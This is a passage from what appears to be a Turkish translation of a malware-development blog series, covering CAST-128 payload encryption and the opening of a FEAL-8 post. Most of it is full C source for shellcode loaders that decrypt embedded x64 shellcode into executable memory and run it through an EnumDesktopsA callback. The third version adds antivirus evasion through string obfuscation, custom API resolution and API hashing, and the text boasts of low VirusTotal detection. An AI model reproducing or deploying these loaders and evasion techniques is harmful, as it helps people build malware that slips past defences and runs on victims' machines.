"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";
ve şifresi çözülmüş payload, EnumDesktopsA fonksiyonu kullanılarak yürütülür.
Tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* encrypt/decrypt payload
* via CAST-128 algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/29/malware-cryptography-31.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define BLOCK_SIZE 8
#define ROUNDS 16
#define KEY_SIZE 16
uint32_t key[4] = {0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210};

// CAST-128 round functions (simplified for demonstration)
void f1(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib) & 0xFFFF); // ensure no overflow
*d = (*d + f) & 0xFFFFFFFF;
}

void f2(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib + 1) & 0xFFFF); // avoid division by zero
*d = (*d ^ f) & 0xFFFFFFFF;
}

void f3(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia - Ib) & 0xFFFF); // ensure no overflow
*d = (*d ^ f) & 0xFFFFFFFF;
}

// key schedule for CAST-128
void cast_key_schedule(uint32_t* key, uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < ROUNDS; i++) {
subkeys[i][0] = key[0];
subkeys[i][1] = key[1];
subkeys[i][2] = key[2];
subkeys[i][3] = key[3];
}
}

// CAST-128 encryption
void cast_encrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];

for (int i = 0; i < ROUNDS; i++) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}
block[0] = right;
block[1] = left;
}

// CAST-128 decryption
void cast_decrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];

for (int i = ROUNDS - 1; i >= 0; i--) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}
block[0] = right;
block[1] = left;
}

void cast_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_encrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}

void cast_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_decrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
unsigned char padded[my_payload_len];
memcpy(padded, my_payload, my_payload_len);

uint32_t subkeys[ROUNDS][4];
cast_key_schedule(key, subkeys);

printf("original shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

cast_encrypt_shellcode(padded, my_payload_len, subkeys);

printf("encrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

cast_decrypt_shellcode(padded, my_payload_len, subkeys);

printf("decrypted shellcode: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)
NULL);
return 0;
}
Bu örnek, CAST-128 şifreleme algoritmasını kullanarak bir payload’u şifrelemeyi ve şifresini çözmeyi göstermektedir. Doğruluğunu kontrol etmek için eklenen yazdırma mantığı bulunmaktadır.
Demo

Hadi her şeyi çalışırken görelim. Derleyelim (Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, hedef makinede (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisini hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++

payload’umuzu .text bölümünde.
pratik örnek 2

Basit mantığımızı güncelleyelim, sadece tüm payload şifre çözme ve çalıştırma işlemini değiştirerek shellcode'u şu şekilde şifre çözüp çalıştırın:
void cast_decrypt_and_execute_shellcode(unsigned char* shellcode, int
shellcode_len, uint32_t subkeys[ROUNDS][4]) {
LPVOID mem_block = NULL;
// allocate a single block for execution
mem_block = VirtualAlloc(NULL, shellcode_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
if (mem_block == NULL) {
printf("memory allocation failed\n");
exit(1);
}

// decrypt the entire shellcode into the allocated memory
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
uint32_t decrypted_block[2];
memcpy(decrypted_block, shellcode + i * BLOCK_SIZE, BLOCK_SIZE);
cast_decrypt(decrypted_block, subkeys);
memcpy((char *)mem_block + i * BLOCK_SIZE, decrypted_block, BLOCK_SIZE);
}

// execute the shellcode using EnumDesktopsA
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem_block,
(LPARAM)NULL);
}
demo 2
Hadi ikinci versiyonu çalışırken görelim. Derleyelim (Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack2.c -o hack2.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, bu versiyonu Windows 11 x64 üzerinde çalıştırın:
.\hack2.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Bu versiyon da mükemmel çalıştı.
pratik örnek 3
Ana "kötü amaçlı yazılımımızı" güncelleyelim: fonksiyon çağrısı bulanıklığı, fonksiyon adlarını karma hale getirme, GetModuleHandle ve GetProcAddress uygulamalarını ekleyerek bazı kaçınma teknikleri ekleyelim.

Bu versiyon şu şekildedir - hack3.c:
/*
* hack3.c
* encrypt/decrypt payload
* via CAST-128 algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/29/malware-cryptography-31.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <string.h>

#define BLOCK_SIZE 8
#define ROUNDS 16
#define KEY_SIZE 16

int cmpUnicodeStr(WCHAR substr[], WCHAR mystr[]) {
_wcslwr_s(substr, MAX_PATH);
_wcslwr_s(mystr, MAX_PATH);
int result = 0;
if (StrStrW(mystr, substr) != NULL) {
	result = 1;
}
return result;
}

typedef BOOL (CALLBACK * EnumDesktopsA_t)(
HWINSTA hwinsta,
DESKTOPENUMPROCA lpEnumFunc,
LPARAM lParam
);

LPVOID (WINAPI * pva)(LPVOID lpAddress, SIZE_T dwSize,
DWORD flAllocationType, DWORD flProtect);

unsigned char cva[] =
{ 0x27, 0x1c, 0x13, 0x17, 0x1e, 0x10, 0x19, 0x20, 0xf, 0x7, 0x1e, 0x16 };
unsigned char udll[] =
{ 0x4, 0x6, 0x4, 0x11, 0x58, 0x43, 0x5b, 0x5, 0xf, 0x7 };
unsigned char kdll[] =
{ 0x1a, 0x10, 0x13, 0xd, 0xe, 0x1d, 0x46, 0x53, 0x4d, 0xf, 0x1d, 0x19 };

char secretKey[] = "quackquack";
// encryption / decryption XOR function
void d(char *buffer, size_t bufferLength, char *key, size_t keyLength) {
int keyIndex = 0;
for (int i = 0; i < bufferLength; i++) {
if (keyIndex == keyLength - 1) keyIndex = 0;
buffer[i] = buffer[i] ^ key[keyIndex];
keyIndex++;
}
}

// custom implementation
HMODULE myGM(LPCWSTR lModuleName) {

// obtaining the offset of PPEB from the beginning of TEB
PEB* pPeb = (PEB*)__readgsqword(0x60);

// obtaining the address of the head node in a linked list
// which represents all the models that are loaded into the process.
PEB_LDR_DATA* Ldr = pPeb->Ldr;
LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;

// iterating to the next node. this will be our starting point.
LIST_ENTRY* pStartListEntry = ModuleList->Flink;

// iterating through the linked list.
WCHAR mystr[MAX_PATH] = { 0 };
WCHAR substr[MAX_PATH] = { 0 };
for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList;
pListEntry = pListEntry->Flink) {
// getting the address of current
// LDR_DATA_TABLE_ENTRY (which represents the DLL).
LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)
((BYTE*)pListEntry - sizeof(LIST_ENTRY));

// checking if this is the DLL we are looking for
memset(mystr, 0, MAX_PATH * sizeof(WCHAR));
memset(substr, 0, MAX_PATH * sizeof(WCHAR));
wcscpy_s(mystr, MAX_PATH, pEntry->FullDllName.Buffer);
wcscpy_s(substr, MAX_PATH, lModuleName);
if (cmpUnicodeStr(substr, mystr)) {
// returning the DLL base address.
return (HMODULE)pEntry->DllBase;
	}
}

// the needed DLL wasn't found
printf("failed to get a handle to %s\n", lModuleName);
return NULL;
}

FARPROC myGPA(HMODULE hModule, LPCSTR lpProcName) {
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS ntHeaders =
(PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
PIMAGE_EXPORT_DIRECTORY exportDirectory =
(PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
VirtualAddress);

DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule +
exportDirectory->AddressOfFunctions);
WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule +
exportDirectory->AddressOfNameOrdinals);
DWORD* addressOfNames = (DWORD*)((BYTE*)hModule +
exportDirectory->AddressOfNames);

for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
return (FARPROC)((BYTE*)hModule + addressOfFunctions
[addressOfNameOrdinals[i]]);
}
}
return NULL;
}

uint32_t key[4] = {0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210};

// CAST-128 round functions (simplified for demonstration)
void f1(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib) & 0xFFFF); // ensure no overflow
*d = (*d + f) & 0xFFFFFFFF;
}

void f2(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib + 1) & 0xFFFF); // avoid division by zero
*d = (*d ^ f) & 0xFFFFFFFF;
}

void f3(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia - Ib) & 0xFFFF); // ensure no overflow
*d = (*d ^ f) & 0xFFFFFFFF;
}

// key schedule for CAST-128
void cast_key_schedule(uint32_t* key, uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < ROUNDS; i++) {
subkeys[i][0] = key[0];
subkeys[i][1] = key[1];
subkeys[i][2] = key[2];
subkeys[i][3] = key[3];
}
}

// CAST-128 encryption
void cast_encrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];
for (int i = 0; i < ROUNDS; i++) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}
block[0] = right;
block[1] = left;
}

// CAST-128 decryption
void cast_decrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];
for (int i = ROUNDS - 1; i >= 0; i--) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}
block[0] = right;
block[1] = left;
}

void cast_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_encrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}

DWORD calcMyHash(char* data) {
DWORD hash = 0x23;
for (int i = 0; i < strlen(data); i++) {
	hash += data[i] + (hash << 1);
}
return hash;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h +
img_dos_header->e_lfanew);
PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
(LPBYTE)h + img_nt_header->OptionalHeader.
DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
PWORD fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
if (calcMyHash(pFuncName) == myHash) {
// printf("successfully found! %s - %d\n", pFuncName, myHash);
return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
}
return nullptr;
}

void cast_decrypt_and_execute_shellcode(unsigned char* shellcode, int
shellcode_len, uint32_t subkeys[ROUNDS][4]) {
LPVOID mem_block = NULL;
// decrypt function string
d((char*)cva, sizeof(cva), secretKey, sizeof(secretKey));
// allocate memory buffer for payload
d((char*)kdll, sizeof(kdll), secretKey, sizeof(secretKey));

wchar_t wtext[20];
mbstowcs(wtext, kdll, strlen(kdll)+1); //plus null
LPWSTR k_dll = wtext;

// HMODULE kernel = GetModuleHandle((LPCSTR)kdll);
HMODULE kernel = myGM(k_dll);
// pva = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress
// (kernel, (LPCSTR)cva);
pva = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))myGPA(kernel,
(LPCSTR)cva);

// allocate a single block for execution
mem_block = pva(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (mem_block == NULL) {
printf("memory allocation failed\n");
exit(1);
}
// decrypt the entire shellcode into the allocated memory
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
uint32_t decrypted_block[2];
memcpy(decrypted_block, shellcode + i * BLOCK_SIZE, BLOCK_SIZE);
cast_decrypt(decrypted_block, subkeys);
memcpy((char *)mem_block + i * BLOCK_SIZE, decrypted_block, BLOCK_SIZE);
}

d((char*)udll, sizeof(udll), secretKey, sizeof(secretKey));
HMODULE mod = LoadLibrary((LPCSTR)udll);
LPVOID addr = getAPIAddr(mod, 121801766);
// printf("0x%p\n", addr);
EnumDesktopsA_t myEnumDesktopsA = (EnumDesktopsA_t)addr;

// execute the shellcode using EnumDesktopsA
myEnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem_block,
(LPARAM)NULL);
}

int main() {
unsigned char padded[] = "\x92\x15\x7e\x1b\x46\x4d\xff\xff"
"\x7d\x55\x52\x41\x61\xcc\x51\x41\x52\x73\x83\x33\x2f\x47"
"\xd2\x65\x4d\x72\xd9\x32\xdd\x92\x8b\x52\x30\x50\x76\xc3"
"\xe3\xb6\x3e\x48\x6f\x80\xe7\x74\xca\x8c\xb7\x4a\x89\xcf"
"\xf1\x65\x42\x9b\xc0\xac\x5a\xe1\x3d\xc3\x26\x8d\x41\xc1"
"\x46\xf4\xac\x53\x3c\x8f\xed\x52\x10\x26\x1e\x76\x05\x3b"
"\x20\x3e\x00\x11\x02\xc3\x0f\x05\x3e\x8b\x13\x71\x86\xc0"
"\x85\x91\x85\xc0\xc1\x50\x76\x8a\x32\xda\x3e\x8b\x3e\x91"
"\x1e\x0d\xf6\x65\x20\x49\x8e\x91\x29\x62\xf9\x95\xc9\x3e"
"\x8b\x52\xe3\xc5\x51\x22\xd6\x4d\x6b\x09\x09\xf0\x50\x32"
"\x41\xc1\x55\x4b\xa1\x74\x68\x80\xe0\x75\xf1\x72\x45\x46"
"\x75\xb8\x08\x45\x93\xd8\x30\x5d\x6f\x63\x44\x8b\xb9\x22"
"\x77\x40\x76\xc8\x3e\x41\x3f\x54\x09\x22\x2d\x60\x40\x1c"
"\xdb\x68\xd5\xb6\xb6\x1a\x04\x88\xbd\x8f\x88\x1f\x40\xa3"
"\x58\x5e\x70\xc9\x03\x02\xde\x9d\x41\x5a\x19\x2f\x13\xc0"
"\xee\xa8\xff\xe0\x7b\xc0\xd2\x48\xf9\xce\x8b\x12\xd9\x7d"
"\xb6\x38\x65\x8d\x49\xc7\x01\x27\x48\x8d\x11\x1d\x48\x8d"
"\x66\xfb\x4c\x8d\x16\x1b\x4c\x8d\xf3\xa0\x30\xc9\x7a\x8a"
"\x31\xc9\xf9\x77\x45\x55\x3e\x46\xff\xd5\x56\x36\xa7\x8c"
"\x88\x2d\xba\xa6\x7c\xde\x19\x3b\x80\x97\x83\xc4\x18\x6a"
"\xfd\x9c\x1e\xc3\xfb\xe0\x68\xd9\xcb\x2d\x36\xff\x6f\x6a"
"\x41\x7e\x94\xc4\xa7\xf9\xd5\x4d\x35\x1b\x18\x5a\x71\x2c"
"\x6f\x77\xed\x5f\x63\x63\x0d\x41\x5e\x3d\x00\x00";

uint32_t subkeys[ROUNDS][4];
cast_key_schedule(key, subkeys);
cast_decrypt_and_execute_shellcode(padded, sizeof(padded), subkeys);
return 0;
}
demo 3
Bu versiyonu derleyin:
x86_64-w64-mingw32-g++ -O2 hack3.c -o hack3.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermission

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, bu versiyonu Windows 11 x64 üzerinde çalıştırın:
.\hack3.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, bu versiyon da mükemmel çalıştı!=..=
Bu versiyonu bir AV tarayıcıya yükleyin:
+++++++++++++++++++++++++++++++++++++++++++++++

Sadece Windows Defender ve Secureageapex'in bu dosyayı kötü amaçlı olarak algıladığını not alın:
+++++++++++++++++++++++++++++++++++++++++++++++
https://websec.nl/en/scanner/result/e2b88162-fd20-4f4b-974a-b4182747f0cb
Bu hack3.exe dosyasını VirusTotal’a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/314a02b70ec00b33aaf1882f8c330a8bfe7c951a32d1b103986052313a4fb5b3/detection
Gördüğünüz gibi, yalnızca 75 AV motorundan 8’i dosyamızı kötü amaçlı olarak algılıyor.

CAST-128’in güçlü yönlerine rağmen, birkaç kriptanalitik çalışmaya konu olmuştur:

Diferansiyel Kriptanaliz: Bu yöntem, girdide yapılan belirli değişikliklerin çıktıda tahmin edilebilir değişiklikler oluşturmasını istismar etmeye çalışır. CAST-128’in tasarımı, özellikle doğrusal olmayan S-kutuları ve anahtar bağımlı dönüşümleri, bu saldırıya karşı direnç sağlamaktadır.
Doğrusal Kriptanaliz: Bu teknik, blok şifreleyicinin davranışını tanımlamak için doğrusal yaklaşımlar bulmaya çalışır. CAST-128’in yapısı ve anahtar planlaması, doğrusal yaklaşımları zorlaştırarak bu tür analizlere karşı direnç sağlamaktadır.
Wikipedia, ancak, CAST-128’i bir brute force aramasından daha hızlı kırabilen pratik saldırılar bulunmadığını belirtmektedir; bu da onu güçlü şifreleme gerektiren uygulamalar için güvenilir bir seçenek haline getirmektedir.
Benim uygulamam basitleştirilmiş olmasına rağmen ve CAST-128 günümüzde AES gibi bazı diğer şifreler kadar yaygın olarak kullanılmasa da, özellikle geriye dönük uyumluluk veya belirli güvenlik gereksinimlerinin söz konusu olduğu durumlarda sağlam bir şifreleme algoritması olarak kalmaktadır. S-kutularının ve anahtar planlamasının dikkatli tasarımı, bilinen kriptografik saldırılara karşı dayanıklılığını artırmaktadır.
Umarım bu gönderi, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, mavi takımların bu ilginç şifreleme tekniği hakkında farkındalık kazanmasını sağlar ve kırmızı takımların cephaneliğine yeni bir silah ekler.
CAST-128 encryption
AV engines evasion for C++ simple malware - part 2: function call obfuscation
AV engines evasion techniques - part 5. Simple C++ example.
Malware AV/VM evasion - part 15: WinAPI GetModuleHandle implementation. Simple
C++ example.
Malware AV/VM evasion - part 16: WinAPI GetProcAddress implementation. Simple
C++ example.
Malware and cryptography 1
Github’taki kaynak kod

95. kötü amaçlı yazılım ve kriptografi araştırması - bölüm 4 (32): FEAL-8 algoritması ile payload şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, kötü amaçlı yazılım geliştirmede FEAL-8 blok şifreleme algoritmasının kullanımına ilişkin kendi araştırmamın sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bunu payload'u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.
FEAL


Akihiro Shimizu ve Shoji Miyaguchi, bu algoritmayı NTT Japonya'da geliştirdi. 64 bitlik bir blok ve anahtar kullanılır. Amaç, DES'e benzer ancak daha güçlü bir tur fonksiyonuna sahip bir algoritma oluşturmaktı. Algoritma, daha az tur ile daha hızlı çalışabilir. Ne yazık ki, gerçeklik tasarım hedefleriyle örtüşmedi.
Şifreleme prosedürü, 64 bitlik bir açık metin parçası ile başlar. Öncelikle, veri bloğu 64 bitlik bir anahtar kullanılarak XOR işlemine tabi tutulur. Veri bloğu daha sonra sol ve sağ yarılara bölünür. Sol yarı, sağ yarı ile birleştirilerek yeni bir sağ yarı oluşturulur. Sol ve yeni sağ yarılar, n turdan geçer (başlangıçta dört). Her turda, sağ yarı 16 bitlik anahtar materyali ile (f fonksiyonu aracılığıyla) birleştirilir ve ardından sol yarı ile XOR işlemine tabi tutularak yeni sağ yarı oluşturulur. Yeni sol yarı, turun başındaki orijinal sağ yarıdan oluşur. n turdan sonra (n. turdan sonra sol ve sağ yarıları değiştirmemeyi unutmayın), sol yarı, sağ yarı ile XOR işlemine tabi tutularak yeni sağ yarı oluşturulur ve ardından 64 bitlik bütün bir veri bloğu oluşturmak için birleştirilir. Algoritma tamamlanmadan önce veri bloğu, başka bir 64 bitlik anahtar materyali ile XOR işlemine tabi tutulur.
Pratik Örnek
Öncelikle rotl fonksiyonuna ihtiyacımız var:
// rotate left 1 bit
uint32_t rotl(uint32_t x, int shift) {
	return (x << shift) | (x >> (32 - shift));
}
Bu fonksiyon, 32 bitlik işaretsiz bir tamsayı (x) üzerinde sola bit kaydırma işlemi gerçekleştirir. x'in bitlerini belirli sayıda konum (shift) sola kaydırır, sol tarafa taşan bitler ise sağ tarafa geri alınır. Bit kaydırma işlemleri, kriptografik algoritmalarda yaygın olarak kullanılır ve verideki desenleri bulanıklaştırarak şifrelemeye direnç kazandırır.
Bir sonraki fonksiyon F fonksiyonudur:
uint32_t F(u32 x1, u32 x2) {
	return rotl((x1 ^ x2), 2);
}
Bu fonksiyon, FEAL-8 algoritmasının temel karıştırma fonksiyonudur. İki 32 bitlik değeri (x1 ve x2) alır, bunları bit düzeyinde XOR (^) işlemine tabi tutar ve ardından rotl fonksiyonu ile sonucu 2 bit sola kaydırır. Bu işlem, şifreleme sürecinin doğrusal olmayan yapısını artırmaya yardımcı olur.
Sıradaki G fonksiyonudur:
// function G used in FEAL-8
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempLeft = *left;
*left = *right;
*right = tempLeft ^ F(*left, *right) ^ *(uint32_t*)roundKey;
}
G fonksiyonu, FEAL-8'in her turunda ana dönüşüm fonksiyonudur. Veri bloğunun sol ve sağ yarıları üzerinde çalışır. İşlemler şunlardır:
Sol yarıyı (tempLeft) kaydeder.
Sol yarıyı sağ yarıya eşitler (*left = *right).
Sağ yarıyı, tempLeft, F fonksiyonunun sonucu ve tur anahtarının XOR'u ile günceller.
Bu fonksiyon, FEAL-8’in her turunda anahtar dönüşümlerini gerçekleştirerek veri bloğunda gerekli yayılım (diffusion) ve karmaşıklık (confusion) etkisini sağlar. XOR işlemi ve F fonksiyonu, verinin karıştırılmasına ve şifrelemenin saldırılara karşı dayanıklı hale getirilmesine yardımcı olur.
